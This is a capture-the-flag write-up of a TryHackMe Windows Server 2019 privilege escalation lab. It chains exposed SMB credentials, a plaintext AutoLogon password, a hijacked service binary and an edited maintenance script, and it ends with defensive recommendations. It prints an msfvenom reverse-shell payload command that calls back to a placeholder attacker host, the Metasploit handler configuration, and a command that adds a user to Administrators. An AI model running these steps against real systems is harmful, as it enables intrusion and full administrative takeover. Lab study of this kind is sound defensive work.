# Windows Privilege Escalation

## From Guest Access to Administrator: SMB Enumeration, Credential Exposure, Service Hijacking, and Insecure Scheduled Tasks

**Platform:** TryHackMe

**Category:** Windows Privilege Escalation

**Operating System:** Windows Server 2019 Datacenter

**Hostname:** PRIVESC

**Difficulty:** Intermediate

**Attack Vector:** Internal Network

**Techniques:** SMB Enumeration, Credential Disclosure, AutoLogon Abuse, Service Binary Hijacking, Insecure File Permissions, Scheduled Task Hijacking

---

# 1. Executive Summary

This challenge demonstrates how multiple security misconfigurations in a Windows environment can be chained together to escalate privileges from a low-privileged guest account to local administrative access.

The target was a Windows Server machine that had not been properly secured following organizational changes. Although the system initially appeared to expose only standard Windows services, further enumeration revealed several weaknesses involving credential storage, file permissions, and service configurations.

The intended privilege escalation path was:

```
guest → thmuser → notadmin → svcadmin → SYSTEM
```

Throughout the assessment, four significant security weaknesses were identified:

1. **Exposed credentials in an SMB share**, allowing access to a legitimate user account.
2. **Plaintext AutoLogon credentials**, enabling lateral movement between local user accounts.
3. **Insecure service executable permissions**, allowing a lower-privileged user to replace a service binary executed under another account.
4. **Weak permissions on a maintenance script**, enabling modification of commands associated with privileged execution.

By chaining these vulnerabilities, it was possible to move between user contexts and ultimately obtain administrative privileges on the target system.

The challenge highlights an important security principle: a successful privilege escalation does not necessarily require a kernel exploit or an unpatched vulnerability. In many environments, weak access controls and exposed credentials can be sufficient.

---

# 2. Initial Reconnaissance

## 2.1. Port Enumeration with Nmap

The assessment began with an Nmap scan targeting commonly used Windows and Active Directory ports.

The purpose was to identify accessible services and determine which ones could provide useful information during enumeration.

### Scan Results

```
PORT     STATE  SERVICE
53/tcp   closed domain
88/tcp   closed kerberos-sec
135/tcp  open   msrpc
139/tcp  open   netbios-ssn
389/tcp  closed ldap
445/tcp  open   microsoft-ds
464/tcp  closed kpasswd5
593/tcp  closed http-rpc-epmap
636/tcp  closed ldapssl
3268/tcp closed globalcatLDAP
3269/tcp closed globalcatLDAPssl
3389/tcp open   ms-wbt-server
5985/tcp open   wsman
9389/tcp closed adws
```

Several services were exposed:

| Port | Service | Relevance |
| --- | --- | --- |
| 135 | MSRPC | Windows Remote Procedure Call |
| 139 | NetBIOS | Legacy Windows file-sharing functionality |
| 445 | SMB | File sharing, authentication, and enumeration |
| 3389 | RDP | Remote Desktop access |
| 5985 | WinRM | Remote administration through WS-Management |

The presence of SMB on port 445 made it a natural starting point.

SMB shares can expose sensitive documents, configuration files, and credentials when access permissions are not properly configured.

Additionally, RDP availability suggested that any valid credentials discovered during enumeration could potentially provide interactive access.

**Next objective:** Enumerate SMB shares and identify accessible resources.

---

# 3. SMB Enumeration and Credential Discovery

## 3.1. Enumerating Available Shares

The first step was to identify available SMB shares using `smbclient`.

```
smbclient -L //<TARGET>/ -N
```

The `-L` option requests a list of shares, while `-N` attempts authentication without prompting for a password.

The server returned:

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Public          Disk      Public file share

SMB1 disabled -- no workgroup available
```

Three standard administrative shares were present:

- `ADMIN$` — Used for remote administration.
- `C$` — Administrative access to the system drive.
- `IPC$` — Interprocess communication.

However, the `Public` share was particularly interesting because it potentially allowed access to files without administrative privileges.

The output also indicated that SMBv1 was disabled, which is generally consistent with modern Windows security practices.

## 3.2. Accessing the Public Share

Using the guest account, I connected to the shared directory:

```
smbclient //<TARGET>/Public -U 'guest%'
```

Inside the share, I discovered a text file containing default employee credentials.

```
New employee default credentials
================================

Username : thmuser
Password : Password1!
```

This was the first significant finding.

The file exposed a valid username and password through a share accessible to a low-privileged account.

### Security Impact

The issue was not an SMB vulnerability itself.

Instead, it was an access control and credential management failure.

Sensitive authentication information had been stored in a location accessible to users who did not require it.

This allowed the initial guest-level access to be converted into authenticated access using a legitimate local account.

**Finding:** Sensitive Credential Disclosure Through SMB.

---

# 4. Initial Access — thmuser

## 4.1. Establishing an RDP Session

With valid credentials identified, I attempted an RDP connection.

```
xfreerdp /u:thmuser /p:'Password1!' \
  /v:<TARGET> \
  /dynamic-resolution +clipboard
```

The connection was successful, providing an interactive Windows desktop session.

The first challenge flag was obtained at this stage.

This marked the first transition in the privilege escalation chain:

```
guest → thmuser
```

## 4.2. Enumerating the Current User

After gaining access, I began enumerating the security context.

```
whoami /all
```

Relevant output:

```
User Name
----------------
privesc\thmuser

SID
------------------------------------------
S-1-5-21-1966530601-3185510712-10604624-1008
```

The session was running under the local account `PRIVESC\thmuser`.

Next, I checked group memberships:

```
whoami /groups
```

Relevant groups included:

```
BUILTIN\Remote Desktop Users
BUILTIN\Users
NT AUTHORITY\INTERACTIVE
NT AUTHORITY\Authenticated Users
NT AUTHORITY\Local account
```

The account was not a member of the local Administrators group.

This indicated that additional privilege escalation would be required.

## 4.3. Checking User Privileges

I inspected the enabled privileges:

```
whoami /priv
```

Output:

```
Privilege Name                State
----------------------------  --------
SeChangeNotifyPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Disabled
```

No immediately useful privileges such as `SeImpersonatePrivilege`, `SeDebugPrivilege`, or `SeBackupPrivilege` were present.

Therefore, direct token-based privilege escalation was not an obvious option.

The next step was to investigate system configuration, services, credentials, and scheduled tasks.

---

# 5. System Enumeration

## 5.1. Operating System Information

I executed:

```
systeminfo
```

Relevant information:

```
Host Name:                 PRIVESC
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763
OS Build:                  17763
OS Configuration:          Standalone Server
System Type:               x64-based PC
System Manufacturer:       Amazon EC2
System Model:              t3.medium
```

The target was a 64-bit Windows Server 2019 instance running in an Amazon EC2 environment.

The standalone server configuration also suggested that local accounts and permissions would be important during the assessment.

## 5.2. Scheduled Task Enumeration

I initially reviewed scheduled tasks to identify scripts or executables running under privileged accounts.

At this stage, only standard Windows tasks were identified, and no immediately exploitable misconfiguration was confirmed.

## 5.3. Service Enumeration

I then examined the installed Windows services:

```
Get-CimInstance Win32_Service |
Select-Object Name,StartName,State,PathName |
Format-List
```

One service stood out:

```
Name      : THMSvc
StartName : .\svcadmin
State     : Stopped
PathName  : C:\Windows\THMSVC\svc.exe
```

This service was particularly interesting because:

- It ran under the dedicated `svcadmin` account.
- Its executable was stored in a custom directory.
- The service was currently stopped.
- Its permissions could potentially provide a privilege escalation opportunity.

At this point, however, I did not yet have evidence that `thmuser` could modify the executable or control the service.

Further enumeration was required.

---

# 6. Privilege Escalation — thmuser to notadmin

## 6.1. Discovering AutoLogon Credentials with WinPEAS

During automated enumeration with WinPEAS, I discovered plaintext credentials stored in the Windows AutoLogon configuration.

The relevant output was:

```
Looking for AutoLogon credentials

Plaintext AutoLogon password found in Winlogon registry values

AutoAdminLogon : 1
DefaultUserName : notadmin
DefaultPassword : P@ssw0rd!
```

### Understanding the Vulnerability

Windows AutoLogon allows a user account to sign in automatically without manually entering credentials.

When configured insecurely, the password may be stored as plaintext in the Windows Registry.

In this case, the credentials belonged to another local account:

```
Username: notadmin
Password: P@ssw0rd!
```

This created another opportunity to move between user accounts.

Although `notadmin` was not necessarily an administrator, different accounts can possess different file, directory, and service permissions.

Therefore, obtaining another account's credentials may expose resources inaccessible to the original user.

## 6.2. Switching to notadmin

Using the recovered credentials, I launched a new PowerShell session:

```
runas /user:PRIVESC\notadmin powershell.exe
```

After successful authentication, a new PowerShell process was started under the `notadmin` account.

The second transition was complete:

```
thmuser → notadmin
```

### Key Takeaway

Privilege escalation does not always involve immediately becoming an administrator.

Moving to another non-administrative account can expose additional permissions that enable the next stage of an attack.

With the `notadmin` account available, I revisited the previously discovered `THMSvc` service.

---

# 7. Service Enumeration — THMSvc

The next objective was to determine whether `notadmin` could control the service or modify the executable it used.

## 7.1. Checking Service Permissions

I queried the service's security descriptor:

```
sc.exe sdshow THMSvc
```

Output:

```
D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)
 (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
 (A;;CCLCSWLOCRRC;;;IU)
 (A;;CCLCSWLOCRRC;;;SU)
 (A;;RPWP;;;BU)
```

The most relevant Access Control Entry was:

```
(A;;RPWP;;;BU)
```

Its components are:

| Component | Meaning |
| --- | --- |
| `A` | Access Allowed |
| `RP` | SERVICE_START |
| `WP` | SERVICE_STOP |
| `BU` | Builtin Users |

This indicated that members of the Builtin Users group could start and stop the service.

Because `notadmin` belonged to this group, it could control the service state without requiring administrative privileges.

However, service control permissions alone were not sufficient.

The next step was to determine whether the executable could be modified.

## 7.2. Checking Executable Permissions

I inspected the executable's NTFS permissions:

```
icacls "C:\Windows\THMSVC\svc.exe"
```

Relevant output:

```
C:\Windows\THMSVC\svc.exe
    Everyone:(F)
    PRIVESC\notadmin:(I)(F)
    BUILTIN\Administrators:(I)(F)
    NT AUTHORITY\SYSTEM:(I)(F)
```

The critical entry was:

```
Everyone:(F)
```

`F` represents Full Control.

This meant the executable could be modified by accounts included in the Everyone security principal.

Additionally, `notadmin` had inherited Full Control permissions.

The combination of permissions created a privilege escalation opportunity:

```
Writable service executable
            +
Permission to start the service
            +
Service running as svcadmin
            |
            v
Code execution as svcadmin
```

### Vulnerability Identified

**Service Binary Hijacking Through Weak NTFS Permissions**

The underlying problem was that a lower-privileged user could replace an executable launched by a service running under a different account.

This crossed a Windows security boundary by allowing a user to influence code executed in another security context.

---

# 8. Exploiting the Service Binary

## 8.1. Generating a Replacement Service Executable

To demonstrate the vulnerability, I generated a Windows service executable using `msfvenom`.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<ATTACKER_HOST> \
  LPORT=4444 \
  -f exe-service \
  -o svc.exe
```

The `exe-service` output format was important because the executable needed to run as a Windows service.

The payload was designed to establish a reverse Meterpreter session when the service started.

## 8.2. Configuring the Metasploit Handler

The corresponding listener was configured in Metasploit:

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_HOST>
set LPORT 4444
set ExitOnSession false
run -j
```

The listener was started before replacing and executing the service binary.

## 8.3. Transferring the Executable

I used RDP drive redirection to make the generated file available inside the Windows environment.

```
xfreerdp /u:thmuser /p:'Password1!' \
  /v:<TARGET> \
  /dynamic-resolution +clipboard \
  /drive:share,$HOME/Documents/Estudos/Challenges
```

The redirected drive made it possible to access the file from the remote Windows session.

## 8.4. Replacing the Original Executable

Using the permissions identified earlier, I replaced the service executable:

```
Copy-Item "C:\share\svc.exe" "C:\Windows\THMSVC\svc.exe" -Force
```

The replacement succeeded because the file permissions allowed modification by the current user.

## 8.5. Starting the Service

With the listener active, I started the service:

```
sc.exe start THMSvc
```

The Service Control Manager returned:

```
SERVICE_NAME: THMSvc
TYPE               : 10  WIN32_OWN_PROCESS
STATE              : 4  RUNNING
WIN32_EXIT_CODE    : 0  (0x0)
SERVICE_EXIT_CODE  : 0  (0x0)
PID                : 6512
```

The service entered the `RUNNING` state.

This confirmed that Windows had launched the replacement executable.

## 8.6. Verifying the New Security Context

A Meterpreter session was established.

I checked the identity:

```
meterpreter > getuid
```

Output:

```
Server username: PRIVESC\svcadmin
```

The result confirmed successful code execution under the `svcadmin` account.

The third privilege escalation stage was complete:

```
notadmin → svcadmin
```

### Why the Attack Worked

The vulnerability resulted from two separate permission failures:

1. The service executable was writable by a lower-privileged account.
2. The same account could start the service.

When the service started, Windows executed the modified binary using the identity configured for the service: `svcadmin`.

The attack did not require exploiting the Windows Service Control Manager itself.

Instead, it abused insecure access control settings.

---

# 9. Enumerating svcadmin

After obtaining a session as `svcadmin`, I continued searching for additional privilege escalation opportunities.

## 9.1. Checking Available Privileges

Within Meterpreter:

```
getprivs
```

Output:

```
Enabled Process Privileges
==========================

SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeIncreaseWorkingSetPrivilege
```

These privileges did not provide an obvious direct path to SYSTEM.

The next step was to investigate writable files associated with privileged processes or automated maintenance operations.

## 9.2. Enumerating Writable Task Files

I inspected files in the Windows Tasks directory and filtered the permissions for the `svcadmin` account.

```
icacls "C:\Windows\Tasks\*" /t /c /q |
Select-String -Pattern "PRIVESC\\svcadmin" -Context 1,0
```

One file stood out:

```
C:\Windows\Tasks\cleanup.bat
```

Relevant permissions:

```
BUILTIN\Users:(I)(RX)
PRIVESC\svcadmin:(I)(M)
```

### Permission Analysis

The permission identifiers mean:

- `RX` — Read and Execute.
- `M` — Modify.
- `I` — Inherited permission.

The `svcadmin` account had permission to modify the batch file.

This was particularly interesting because the file was located in a directory associated with Windows task execution.

If the script was executed by a privileged scheduled task, modifying its contents could allow commands to run with the task's security context.

### Vulnerability Identified

**Insecure Permissions on a Maintenance Script**

A lower-privileged service account could modify a script used in an automated maintenance workflow.

This created the possibility of privileged command execution.

---

# 10. Abusing the Maintenance Script

## 10.1. Modifying cleanup.bat

To demonstrate the impact, I replaced the script content with a command that added `thmuser` to the local Administrators group.

```
Set-Content -Path C:\Windows\Tasks\cleanup.bat `
  -Value "net localgroup Administrators thmuser /add"
```

The command would add `thmuser` to Administrators if executed by an account with sufficient privileges.

This technique is based on a simple trust boundary violation:

A lower-privileged account can modify a file that is subsequently executed by a more privileged security context.

## 10.2. Verifying Administrative Group Membership

After the maintenance workflow executed, I checked the local Administrators group:

```
net localgroup Administrators
```

Output:

```
Alias name     Administrators
Comment        Administrators have complete and
               unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
thmuser

The command completed successfully
```

The result confirmed that `thmuser` had been added to the local Administrators group.

This established administrative access to the machine.

The final challenge flag was then retrieved from an elevated PowerShell session using the `thmuser` account.

### Why This Technique Matters

The weakness was not the `net localgroup` command itself.

The security issue was the ability of a lower-privileged account to change the contents of a file involved in a more privileged execution workflow.

When privileged automation executes files that less-privileged users can modify, the effective privilege boundary can be bypassed.

---

# 11. Complete Attack Chain

The attack progressed through a series of individually exploitable misconfigurations.

```
+-------------------------------+
|          Guest Access         |
+-------------------------------+
                |
                | SMB Enumeration
                | Exposed Credentials
                v
+-------------------------------+
|            thmuser            |
+-------------------------------+
                |
                | WinPEAS Enumeration
                | Plaintext AutoLogon
                v
+-------------------------------+
|            notadmin           |
+-------------------------------+
                |
                | Writable Service Binary
                | Service Start Permission
                v
+-------------------------------+
|            THMSvc             |
+-------------------------------+
                |
                | Service Binary Hijacking
                | Execution as svcadmin
                v
+-------------------------------+
|            svcadmin           |
+-------------------------------+
                |
                | Writable cleanup.bat
                | Privileged Task Execution
                v
+-------------------------------+
|     Local Administrators      |
|       (thmuser added)         |
+-------------------------------+
                |
                | Elevated PowerShell
                v
+-------------------------------+
|        Final Flag Access      |
+-------------------------------+
```

Each stage exposed permissions or credentials that were not available to the previous user context.

This made continuous enumeration essential.

After obtaining each account, the attack surface had to be reassessed.

---

# 12. Vulnerability Summary

| Finding | Root Cause | Security Impact |
| --- | --- | --- |
| Exposed SMB credentials | Sensitive files accessible to low-privileged users | Unauthorized account access |
| Plaintext AutoLogon password | Insecure credential storage | Access to another local account |
| Writable service executable | Excessive NTFS permissions | Code execution as svcadmin |
| Weak service control permissions | Unnecessary start/stop rights for standard users | Enabled execution of replaced service binary |
| Writable maintenance script | Insecure file permissions in an automated workflow | Unauthorized administrative group modification |

The most important observation is that the final compromise did not depend on a single sophisticated vulnerability.

Instead, the attack succeeded by combining multiple configuration weaknesses.

---

# 13. Defensive Recommendations

## 13.1. Secure SMB Shares

SMB shares should be regularly audited to identify sensitive documents and excessive permissions.

Recommended actions include:

- Removing plaintext credentials from shared directories.
- Restricting access using least-privilege ACLs.
- Reviewing guest and anonymous access configurations.
- Monitoring access to sensitive shared files.
- Rotating any credentials that have been exposed.

## 13.2. Protect Stored Credentials

Plaintext AutoLogon credentials create unnecessary risk.

Organizations should avoid storing reusable passwords in readable configuration locations.

Where automatic sign-in is operationally necessary, administrators should evaluate supported alternatives that reduce credential exposure.

Credential access and configuration changes should also be monitored.

## 13.3. Restrict Service Executable Permissions

Executable files used by Windows services must not be writable by unprivileged accounts.

Recommended controls include:

- Removing Full Control permissions from Everyone and other broad groups.
- Restricting file modification to authorized administrators.
- Separating service execution identities from regular user accounts.
- Auditing service executable directories.
- Monitoring unexpected changes to service binaries.

## 13.4. Review Service Control Permissions

Service permissions should follow the principle of least privilege.

Standard users should not be able to modify, restart, or control privileged services unless such access is explicitly required.

Both the service security descriptor and NTFS permissions must be reviewed.

## 13.5. Secure Scheduled Tasks and Scripts

Maintenance scripts executed by privileged accounts should be protected against unauthorized modification.

Recommended measures include:

- Restricting write permissions on scripts and their parent directories.
- Reviewing the security context of scheduled tasks.
- Monitoring changes to scheduled task definitions.
- Implementing integrity monitoring for privileged scripts.
- Avoiding execution of privileged automation from user-writable locations.

## 13.6. Improve Windows Security Monitoring

Relevant security events may include:

| Event ID | Description |
| --- | --- |
| 4624 | Successful logon |
| 4672 | Special privileges assigned to a new logon |
| 4698 | Scheduled task created, when auditing is enabled |
| 4732 | Member added to a security-enabled local group |
| 7045 | Service installed |

These events should be correlated with file integrity monitoring and process execution telemetry.

For example, Event ID 4732 can help identify unauthorized additions to the local Administrators group.

Service binary replacement, however, generally requires additional visibility beyond service installation events.

---

# 14. Lessons Learned

This challenge reinforced several important concepts in Windows privilege escalation.

### Enumeration Must Be Repeated After Every Privilege Change

Obtaining a new user account does not automatically mean gaining administrative privileges.

However, each account may have access to different services, files, directories, and credentials.

Re-enumeration is therefore essential after every successful transition.

### Credentials Are Often More Valuable Than Exploits

The initial compromise did not require exploiting a software vulnerability.

A plaintext credential file in an SMB share was enough to establish interactive access.

The subsequent discovery of AutoLogon credentials continued the escalation chain.

### File Permissions Can Be as Dangerous as Software Vulnerabilities

The `THMSvc` service demonstrated how a writable executable can create a security boundary violation.

An attacker does not need to compromise the Service Control Manager when the underlying executable is insufficiently protected.

### Privileged Automation Requires Strict Integrity Controls

Scripts executed by privileged accounts must be protected against modification by less-privileged users.

Otherwise, the automation process may become a mechanism for unauthorized command execution.

### Multiple Low-Complexity Weaknesses Can Produce High Impact

Each individual weakness may appear relatively straightforward.

However, when combined, they can enable an attacker to move from guest-level access to administrative control.

This is why security assessments must evaluate how vulnerabilities interact, rather than treating every finding in isolation.

---

# 15. Conclusion

This TryHackMe challenge provided a practical demonstration of Windows privilege escalation through credential exposure and insecure access control configurations.

Starting from a guest account, SMB enumeration revealed credentials for `thmuser`, allowing interactive access through RDP.

Further enumeration with WinPEAS uncovered plaintext AutoLogon credentials for `notadmin`.

The `notadmin` account possessed the permissions needed to modify and start a Windows service running under `svcadmin`, enabling service binary hijacking and execution in that account's security context.

Finally, enumeration of the `svcadmin` environment revealed a modifiable maintenance script. By changing that script, administrative group membership was altered, allowing `thmuser` to obtain elevated access and retrieve the final challenge flag.

The overall assessment demonstrates that privilege escalation is often the result of **misconfigured trust relationships between users, files, services, and automated processes**.

Strong endpoint security requires more than patch management. Proper credential handling, restrictive access controls, service hardening, and continuous auditing are equally essential.

**Key takeaway:** A single misconfiguration may appear minor, but several misconfigurations chained together can lead to a complete administrative compromise of a Windows system.